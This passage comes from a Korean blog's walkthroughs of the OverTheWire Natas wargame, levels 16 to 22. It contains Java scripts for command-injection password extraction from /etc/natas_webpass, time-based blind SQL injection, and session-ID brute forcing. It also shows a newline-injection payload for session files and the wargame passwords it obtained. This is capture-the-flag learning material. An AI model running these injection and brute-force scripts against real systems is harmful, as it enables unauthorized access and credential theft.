/etc/natas_webpass/natas17)African(African위치엔 원하는 문자열을 사용해도 무방) /etc/natas_webpass/natas17의 내용이 a로 시작하다면 $()안에 있는것이 실행되고 아니라면 뒤에 dictionary.txt에서 African을 찾는다. 이를 이용해 African이 출력되지 않으면 시작하는 문자를 찾을 수 있을 것이다. burp suite에 brute force기능이 있다는 것을 알게 되었다.위에 있는 것이 맞는지 확인해보기 위해 brute force해본다. 8이 입력됬을 때만 길이가 다르다. 아마 African이 출력되지 않아서 그런것 같다. 8을 넣어서 확인해 본다. 이제 해결법을 찾았니 자동화 스크립트를 사용해 패스워드를 얻어낸다.전단계에 사용해던 스크립트를 조금 손보면 될 것 같다. import java.io.BufferedReader; import java.io.InputStreamReader; import java.io.PrintStream; import java.net.Socket; public class SimpleHttpClient { public static void main(String[] args) throws Exception { String a= &quot;&quot;; for (int i = 1; i &lt;= 32; i++) { for (int j = 48; j &lt; 123; j++) { int failed=0; if (58 &lt;= j &amp;&amp; j &lt;= 64) { continue; } if (91 &lt;= j &amp;&amp; j &lt;= 96) { continue; } // 소켓 및 입출력 스트림 준비 Socket socket = new Socket(&quot;176.9.9.172&quot;, 80); BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream())); PrintStream out = new PrintStream(socket.getOutputStream()); // 요청라인 out.println(&quot;GET /?needle=%24%28grep+%5E&quot;+a+(char)j+&quot;+%2Fetc%2Fnatas_webpass%2Fnatas17%29African&amp;submit=Search HTTP/1.1&quot;); // 헤더정보 out.println(&quot;Host: natas16.natas.labs.overthewire.org&quot;); out.println(&quot;Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==&quot;); out.println(); // 응답 내용 String line = null; while((line = in.readLine()) != null) { if(line.contains(&quot;African&quot;)){ failed=1; in.close(); out.close(); socket.close(); break; } } if(failed == 0){ a=a+(char)j; break; } in.close(); out.close(); socket.close(); } System.out.println(a); } } } level17의 패스워드를 찾았다! 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw","link":"/2022/01/25/Natas/natas16/"},{"title":"Natas 워게임 level17 풀이","text":"Level Goal Username:check existence 사용자 이름: 존재 확인 Username: natas17URL: http://natas17.natas.labs.overthewire.org 예전에 했던 것과 비슷한것 같다.일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas17&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas17&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(&quot;username&quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas17', '&lt;censored&gt;'); mysql_select_db('natas17', $link); $query = &quot;SELECT * from users where username=\\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\\&quot;&quot;; if(array_key_exists(&quot;debug&quot;, $_GET)) { echo &quot;Executing query: $query&lt;br&gt;&quot;; } $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) &gt; 0) { //echo &quot;This user exists.&lt;br&gt;&quot;; } else { //echo &quot;This user doesn't exist.&lt;br&gt;&quot;; } } else { //echo &quot;Error in query.&lt;br&gt;&quot;; } mysql_close($link); } else { ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 이젠 결과가 참이던 거짓이던 쿼리는 실행되지만 아무것도 출력되지 않는다. 이래서 뭐가 참인지 거짓인지 모르겠다.blind injection 종류를 찾아보니 time based blind injection이 있다. 이는 시간차를 이용하여 결과를 얻어내는 방법이다. 예) 참이면 5초를 기다린 후 응답해라 sleep을 이용한다. sleep(시간:단위 초)를 뒤에 붙여주면 응답을 주어진 시간이 지난뒤에 응답해준다. 이를 이용하여 blind injection 공격을 시도하는 스크립트를 작성한다. 전에 사용하던 코드를 수정해서 패스워드를 알아낸긴 힘들 것 같다.더 빠르고 안끊기는 업그레이드 된 정석 버전의 코드를 가져와 수정하였다!!!!! 힘들다.응애(프로그래밍 어렵다..) 코드 틀 출처 및 참고 : https://limdevbasic.tistory.com/14 import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.net.HttpURLConnection; import java.net.URL; public class Main { public static void main(String[] args) throws IOException { String pw=&quot; &quot;; for(int i=1;i&lt;=32;i++){ for (int j = 48; j &lt;= 123; j++) { if (58 &lt;= j &amp;&amp; j &lt;= 64) { continue; } if (91 &lt;= j &amp;&amp; j &lt;= 96) { continue; } long beforeTime = System.currentTimeMillis(); String www = &quot;http://natas17.natas.labs.overthewire.org&quot;; String parameter = &quot;?username=natas18%22+and+ascii%28substr%28password%2C&quot; + Integer.toString(i) + &quot;%2C1%29%29%3D&quot; + Integer.toString(j) + &quot;+and+sleep%285%29%23&quot;; URL url = new URL(www + parameter); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); connection.setRequestMethod(&quot;GET&quot;); connection.setRequestProperty(&quot;host&quot;, &quot;natas17.natas.labs.overthewire.org&quot;); connection.setRequestProperty(&quot;Authorization&quot;, &quot;Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==&quot;); int responseCode = connection.getResponseCode(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream())); StringBuffer stringBuffer = new StringBuffer(); String inputLine; while ((inputLine = bufferedReader.readLine()) != null) { stringBuffer.append(inputLine); } bufferedReader.close(); long afterTime = System.currentTimeMillis(); long secDiffTime = (afterTime - beforeTime) / 1000; if (secDiffTime &gt;= 5){ pw = pw + (char) j; System.out.println(pw); } } } } } level18의 패스워드를 찾았다! xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP","link":"/2022/01/27/Natas/natas17/"},{"title":"Natas 워게임 level18 풀이","text":"Level Goal Please login with your admin account to retrieve credentials for natas19. natas19에 대한 자격 증명을 검색하려면 관리자 계정으로 로그인하십시오. Username: natas18URL: http://natas18.natas.labs.overthewire.org 관리자 계정????이번 문제는 관리자 계정의 무언가를 획득하여 로그인하거나 요청하면 될것 같다. 일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas18&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas18&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? $maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST[\"username\"] == \"admin\") { /* This method of authentication appears to be unsafe and has been disabled for now. */ //return 1; } return 0; } /* }}} */ function isValidID($id) { /* {{{ */ return is_numeric($id); } /* }}} */ function createID($user) { /* {{{ */ global $maxid; return rand(1, $maxid); } /* }}} */ function debug($msg) { /* {{{ */ if(array_key_exists(\"debug\", $_GET)) { print \"DEBUG: $msg\"; } } /* }}} */ function my_session_start() { /* {{{ */ if(array_key_exists(\"PHPSESSID\", $_COOKIE) and isValidID($_COOKIE[\"PHPSESSID\"])) { if(!session_start()) { debug(\"Session start failed\"); return false; } else { debug(\"Session start ok\"); if(!array_key_exists(\"admin\", $_SESSION)) { debug(\"Session was old: admin flag set\"); $_SESSION[\"admin\"] = 0; // backwards compatible, secure } return true; } } return false; } /* }}} */ function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) { print \"You are an admin. The credentials for the next level are:\"; print \"Username: natas19\\n\"; print \"Password: \"; } else { print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.\"; } } /* }}} */ $showform = true; if(my_session_start()) { print_credentials(); $showform = false; } else { if(array_key_exists(&quot;username&quot;, $_REQUEST) &amp;&amp; array_key_exists(&quot;password&quot;, $_REQUEST)) { session_id(createID($_REQUEST[&quot;username&quot;])); session_start(); $_SESSION[&quot;admin&quot;] = isValidAdminLogin(); debug(&quot;New session started&quot;); $showform = false; print_credentials(); } } if($showform) { ?&gt; &lt;p&gt; Please login with your admin account to retrieve credentials for natas19. &lt;/p&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; Password: &lt;input name=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt; &lt;/form&gt; &lt;? } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 원래는 유저 이름에 admin이 들어가면 1을 반환하여 패스워드가 출력할 수 있었는데 보안상의 이유로 1을 반환하는 코드를 주석처리 하였다.. 또한 세션에 시작될때 0을 반환하여 패스워드를 출력하지 못하게 하였다.. 우리가 해야할 일은 admin의 세션id를 알아내면 된다.세션 id는 1부터 650까지 랜덤으로 생성된다.그럼 아주쉽다!!!burte force!!!!하나씩 대입을 해 찾아보자! burp suite의 brute force 기능을 사용한다. POST /index.php HTTP/1.1 Host: natas18.natas.labs.overthewire.org Content-Length: 24 Cache-Control: max-age=0 Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA== Upgrade-Insecure-Requests: 1 Origin: http://natas18.natas.labs.overthewire.org Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://natas18.natas.labs.overthewire.org/ Accept-Encoding: gzip, deflate Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: __utma=176859643.1329070341.1643077025.1643077025.1643077025.1; __utmz=176859643.1643077025.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=§527§ Connection: close username=admin&amp;password= PHPSESSID가 세션 아이디이다. 이 값을 변수로 지정하고 숫자 1부터 650까지 대입하도록 세팅한다. brute force를 시작한다! length를 높은 순으로 정렬하고 기달리면 길이가 1370짜리가 생긴다.아마 패스워드가 출력되어 혼자만 길이가 다른 것 같다.해당 번호가 admin세션 아이디일 확률이 높다! PHPSESSID를 수정한뒤 요청하면 된다. level19의 패스워드를 찾았다! 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs","link":"/2022/01/28/Natas/natas18/"},{"title":"Natas 워게임 level19 풀이","text":"Level Goal This page uses mostly the same code as the previous level, but session IDs are no longer sequential… Please login with your admin account to retrieve credentials for natas20. 이 페이지는 이전 레벨과 거의 동일한 코드를 사용하지만 세션 ID는 더 이상 순차적이지 않습니다… natas20에 대한 자격 증명을 검색하려면 관리자 계정으로 로그인하십시오. Username: natas19URL: http://natas19.natas.labs.overthewire.org 전단계와 같은 문제이다.하지만 이번엔 소스코드를 보여주지 않는다.힌트를 보니 세션ID 생성코드만 다르고 거의 전단계와 비슷할 것 같다. 일단 PHPSESSID를 확인해 본다. 확실히 전단계와 다르다 3230322d61646d696e (16진수 인가?) 소스코드를 안보여주는 보니 암호화 하는 방식만 알아낸다면 풀수 있을 것 같다. 숫자 중간에 알파벳이 들어가는 거 보니 16진수인 것 같다. 내 예상이 맞았다 16진수다.**cyberchef(암복호화 사이트)**를 이용하였다. 202-admin세션 형식이 숫자-admin인것 같다.이를 이용한 자동화 스크립트를 만들면 될 것 같다. import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.net.HttpURLConnection; import java.net.URL; public class Main { public static String stringToHex(String s) { String result = &quot;&quot;; for (int i = 0; i &lt; s.length(); i++) { result += String.format(&quot;%02X&quot;, (int) s.charAt(i)); } return result; } public static void main(String[] args) throws IOException { String pw=&quot; &quot;; for(int i=1;i&lt;=640;i++){ String www = &quot;http://natas19.natas.labs.overthewire.org&quot;; pw = Integer.toString(i); URL url = new URL(www); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); System.out.println(i+&quot;try: &quot;+stringToHex(pw)); connection.setRequestMethod(&quot;GET&quot;); connection.setRequestProperty(&quot;host&quot;, &quot;natas19.natas.labs.overthewire.org&quot;); connection.setRequestProperty(&quot;Authorization&quot;, &quot;Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==&quot;); connection.setRequestProperty(&quot;Cookie&quot;, &quot;176859643.1329070341.1643077025.1643077025.1643077025.1; __utmz=176859643.1643077025.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=&quot;+stringToHex(pw)+&quot;2d61646d696e&quot;); int responseCode = connection.getResponseCode(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream())); StringBuffer stringBuffer = new StringBuffer(); String inputLine; while ((inputLine = bufferedReader.readLine()) != null) { stringBuffer.append(inputLine); if(inputLine.contains(&quot;Password&quot;)){ System.out.println(&quot;SUCCESS :&quot;+stringToHex(pw) ); break; } } bufferedReader.close(); } } } 281이 세션ID이다!!!! PHPSESSID를 변경한뒤 요청한다. level20의 패스워드를 찾았다! eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF","link":"/2022/01/28/Natas/natas19/"},{"title":"Natas 워게임 level20 풀이","text":"Level Goal You are logged in as a regular user. Login as an admin to retrieve credentials for natas21. 일반 사용자로 로그인되어 있습니다. natas21에 대한 자격 증명을 검색하려면 관리자로 로그인합니다. Username: natas20URL: http://natas20.natas.labs.overthewire.org 이번에도 전단계와 비슷하다.하지만 소스코드가 공개되고 로그인 버튼이 이름 변경버튼으로 바뀌었다. 뭐가 어떻게 바뀌었는지 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas20&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas20&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? function debug($msg) { /* {{{ */ if(array_key_exists(\"debug\", $_GET)) { print \"DEBUG: $msg\"; } } /* }}} */ function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) { print \"You are an admin. The credentials for the next level are:\"; print \"Username: natas21\\n\"; print \"Password: \"; } else { print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\"; } } /* }}} */ /* we don't need this */ function myopen($path, $name) { //debug(&quot;MYOPEN $path $name&quot;); return true; } /* we don't need this */ function myclose() { //debug(&quot;MYCLOSE&quot;); return true; } function myread($sid) { debug(&quot;MYREAD $sid&quot;); if(strspn($sid, &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;) != strlen($sid)) { debug(&quot;Invalid SID&quot;); return &quot;&quot;; } $filename = session_save_path() . &quot;/&quot; . &quot;mysess_&quot; . $sid; if(!file_exists($filename)) { debug(&quot;Session file doesn't exist&quot;); return &quot;&quot;; } debug(&quot;Reading from &quot;. $filename); $data = file_get_contents($filename); $_SESSION = array(); foreach(explode(&quot;\\n&quot;, $data) as $line) { //라인의 값에서 줄바꿈을 기준으로 문자열을 나눈다. debug(&quot;Read [$line]&quot;); $parts = explode(&quot; &quot;, $line, 2); //라인의 값에서 공백을 기준으로 2개의 문자열로 나눈다. if($parts[0] != &quot;&quot;) $_SESSION[$parts[0]] = $parts[1]; //첫번째 배열값이 공백이 아니면 세션의 parts[0]값을 parts[1]의 값으로 바꾼다.(응애 php초보라 $_SESSION[$parts[0]] = $parts[1] 제대로 해석 못하겠다... 틀려도 양해부탁합니다) } return session_encode(); } function mywrite($sid, $data) { // $data contains the serialized version of $_SESSION // but our encoding is better debug(&quot;MYWRITE $sid $data&quot;); // make sure the sid is alnum only!! if(strspn($sid, &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;) != strlen($sid)) { debug(&quot;Invalid SID&quot;); return; } $filename = session_save_path() . &quot;/&quot; . &quot;mysess_&quot; . $sid; $data = &quot;&quot;; debug(&quot;Saving in &quot;. $filename); ksort($_SESSION); foreach($_SESSION as $key =&gt; $value) { debug(&quot;$key =&gt; $value&quot;); $data .= &quot;$key $value\\n&quot;; } file_put_contents($filename, $data); chmod($filename, 0600); } /* we don't need this */ function mydestroy($sid) { //debug(&quot;MYDESTROY $sid&quot;); return true; } /* we don't need this */ function mygarbage($t) { //debug(&quot;MYGARBAGE $t&quot;); return true; } session_set_save_handler( &quot;myopen&quot;, &quot;myclose&quot;, &quot;myread&quot;, &quot;mywrite&quot;, &quot;mydestroy&quot;, &quot;mygarbage&quot;); session_start(); if(array_key_exists(&quot;name&quot;, $_REQUEST)) { $_SESSION[&quot;name&quot;] = $_REQUEST[&quot;name&quot;]; debug(&quot;Name set to &quot; . $_REQUEST[&quot;name&quot;]); } print_credentials(); $name = &quot;&quot;; if(array_key_exists(&quot;name&quot;, $_SESSION)) { $name = $_SESSION[&quot;name&quot;]; } ?&gt; &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; Your name: &lt;input name=&quot;name&quot; value=&quot;&lt;?=$name?&gt;&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Change name&quot; /&gt; &lt;/form&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 이전 단계들과 비슷하게 admin과 admin세션 값이 1이면 패스워드가 출력된다. 또한 debug라는 함수가 계속 무언가를 출력할 수 있도록한다.아마 이를 이용하는 문제 인것 같다. get방식으로 요청을 보내면 출력을 하도록 되어 있는 것 같다.요청할 때 debug있어야 메세지가 출력되도록 되어 있다.일단 debug만 넣어 요청해 본다. PHPSESSID와 세션 저장 경로가 출력되었다. 잘 출력되는 것을 확인 했으니 이름도 요청해서 출력해 본다. debug를 출력하고 저장하기에? 새로고침을 하여 값이 제대로 나오게 한다. name에 admin이 잘들어 간 것이 확인 되었다.이제 주석내용을 참고하여 줄바꿈을 기준과 공백을 기준으로 admin과 admin 1을 넣어 요청을한다. http://natas20.natas.labs.overthewire.org/?debug&amp;name=admin%0aadmin%201 level21의 패스워드를 찾았다! IFekPyrQXftziDEsUr3x21sYuahypdgJ","link":"/2022/01/30/Natas/natas20/"},{"title":"Natas 워게임 level21 풀이","text":"Level Goal Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.orgYou are logged in as a regular user. Login as an admin to retrieve credentials for natas22. 참고: 이 웹사이트는 http://natas21-experimenter.natas.labs.overthewire.org와 같은 위치에 있습니다. 일반 사용자로 로그인되어 있습니다. natas22에 대한 자격 증명을 검색하려면 관리자로 로그인합니다. Username: natas21URL: http://natas21.natas.labs.overthewire.org http://natas21-experimenter.natas.labs.overthewire.org와 같은 위치에 있다는 것이 무슨 말인지 이해가 안간다. 일단 하이퍼 링크를 눌러본다. 이번엔 http://natas21.natas.labs.overthewire.org와 같은 위치에 있다고 한다. 더욱더 이해가 안간다. 일단 둘의 소스코드를 봐본다. http://natas21.natas.labs.overthewire.org/ &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas21&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas21&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;p&gt; &lt;b&gt;Note: this website is colocated with &lt;a href=&quot;http://natas21-experimenter.natas.labs.overthewire.org&quot;&gt;http://natas21-experimenter.natas.labs.overthewire.org&lt;/a&gt;&lt;/b&gt; &lt;/p&gt; &lt;? function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) { print \"You are an admin. The credentials for the next level are:\"; print \"Username: natas22\\n\"; print \"Password: \"; } else { print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.\"; } } /* }}} */ session_start(); print_credentials(); ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 이번에도 이전 단계와 비슷하게 admin으로 로그인하면 되는 것 같다. http://natas21-experimenter.natas.labs.overthewire.org/ &lt;html&gt; &lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.overthewire.org/wargames/natas/level.css&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas21 - CSS style experimenter&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;p&gt; &lt;b&gt;Note: this website is colocated with &lt;a href=&quot;http://natas21.natas.labs.overthewire.org&quot;&gt;http://natas21.natas.labs.overthewire.org&lt;/a&gt;&lt;/b&gt; &lt;/p&gt; &lt;? session_start(); // if update was submitted, store it if(array_key_exists(&quot;submit&quot;, $_REQUEST)) { foreach($_REQUEST as $key =&gt; $val) { $_SESSION[$key] = $val; } } if(array_key_exists(&quot;debug&quot;, $_GET)) { print &quot;[DEBUG] Session contents:&lt;br&gt;&quot;; print_r($_SESSION); } // only allow these keys $validkeys = array(&quot;align&quot; =&gt; &quot;center&quot;, &quot;fontsize&quot; =&gt; &quot;100%&quot;, &quot;bgcolor&quot; =&gt; &quot;yellow&quot;); $form = &quot;&quot;; $form .= '&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;'; foreach($validkeys as $key =&gt; $defval) { $val = $defval; if(array_key_exists($key, $_SESSION)) { $val = $_SESSION[$key]; } else { $_SESSION[$key] = $val; } $form .= &quot;$key: &lt;input name='$key' value='$val' /&gt;&lt;br&gt;&quot;; } $form .= '&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&gt;'; $form .= '&lt;/form&gt;'; $style = &quot;background-color: &quot;.$_SESSION[&quot;bgcolor&quot;].&quot;; text-align: &quot;.$_SESSION[&quot;align&quot;].&quot;; font-size: &quot;.$_SESSION[&quot;fontsize&quot;].&quot;;&quot;; $example = &quot;&lt;div style='$style'&gt;Hello world!&lt;/div&gt;&quot;; ?&gt; &lt;p&gt;Example:&lt;/p&gt; &lt;?=$example?&gt; &lt;p&gt;Change example values here:&lt;/p&gt; &lt;?=$form?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 두 번째 페이지 소스코드를 보니 이전 단계와 비슷하게 debug로 세션 내용을 출력한다. 이걸 이용하면 문제를 풀 수 있을 것 같다. 전과 같이 debug를 넣어 요청한다. 세션에 내용이 출력 되었다. 처음에 http://natas21.natas.labs.overthewire.org와 http://natas21-experimenter.natas.labs.overthewire.org같은 위치에 있다는게 똑같은 곳에서 작동하는 것 같다. 아마 http://natas21-experimenter.natas.labs.overthewire.org세션 값에 admin을 넣으면 http://natas21.natas.labs.overthewire.org에 넣어진 것 과 같은 효과가 있는 것 같다. 일단 admin=1을 넣어서 요청해본다. 세션 값에 admin=1이 잘 들어갔다. 메인 페이지와 experimenter페이지는 연결되어 있기때문에 메인페이제 세션 값을 experimenter페이지의 세션값으로 바꾸어주면 될것 같다. level22의 패스워드를 찾았다! chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ","link":"/2022/01/30/Natas/natas21/"},{"title":"Natas 워게임 level22 풀이","text":"Level Goal “ “ “ “ Username: natas22URL: http://natas22.natas.labs.overthewire.org 완전 아무것도 출력되지 않았다. 얼른 소스코드를 본다. &lt;? session_start(); if(array_key_exists(&quot;revelio&quot;, $_GET)) { // only admins can reveal the password if(!($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1)) { header(&quot;Location: /&quot;); } } ?&gt; &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas22&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas22&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? if(array_key_exists(&quot;revelio&quot;, $_GET)) { print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;; print &quot;&lt;pre&gt;Username: natas23\\n&quot;; print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;; } ?&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; get방식으로 